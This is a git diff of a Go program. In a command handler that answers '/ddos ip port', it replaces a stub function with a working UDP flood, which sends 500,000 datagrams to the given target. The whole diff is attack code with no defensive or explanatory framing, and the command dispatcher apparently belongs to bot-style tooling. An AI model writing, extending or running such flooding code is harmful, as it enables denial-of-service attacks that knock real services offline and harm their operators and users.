@@ -3,19 +3,43 @@ package main
 import (
 	"fmt"
 	"net"
-	"strconv"
 	"strings"
 )
 
-func dos(ip string, port int) {
-	if ip != "None" {
-		fmt.Printf("[DOS](%s:%d) - processing", ip, port)
-	} else {
-		fmt.Println("[err] DOS is imposible")
+func CreateDatagramm(data string, address string, port string) (string, *net.UDPAddr) {
+	serverAddr, err := net.ResolveUDPAddr("udp", address+":"+port)
+	if err != nil {
+		fmt.Println("Error: ", err)
+	}
+
+	return data, serverAddr
+}
+
+func sendUdp(data string, serverAddr *net.UDPAddr) {
+	conn, err := net.DialUDP("udp", nil, serverAddr)
+	if err != nil {
+		fmt.Println("Error: ", err)
+		return
+	}
+	defer conn.Close()
+
+	_, err = conn.Write([]byte(data))
+
+	if err != nil {
+		fmt.Println("Error: ", err)
+		return
 	}
 }
 
-func getIpPort(str string) (string, int) {
+func udpFlood(host string, port string) {
+	udpString := "pkg"
+	fmt.Println("[DOS] - Processing")
+	for i := 1; i <= 500_000; i++ {
+		data, serverAddr := CreateDatagramm(udpString, host, port)
+		sendUdp(data, serverAddr)
+	}
+}
+func getIpPort(str string) (string, string) {
 
 	cmdList := strings.Split(str, " ")
 
@@ -23,11 +47,10 @@ func getIpPort(str string) (string, int) {
 
 	if len(cmdList) > 2 {
 		port := cmdList[2]
-		iport, _ := strconv.Atoi(port)
 
-		return ip, iport
+		return ip, port
 	}
-	return "None", 0
+	return "None", "None"
 }
 func getSourceParram(cmd string) (string, error) {
 	paramsList := strings.Split(cmd, " ")
@@ -44,7 +67,7 @@ func source(cmd string) {
 	switch cmdParam {
 	case "/ddos":
 		ip, port := getIpPort(cmd)
-		dos(ip, port)
+		udpFlood(ip, port)
 
 	}
 }
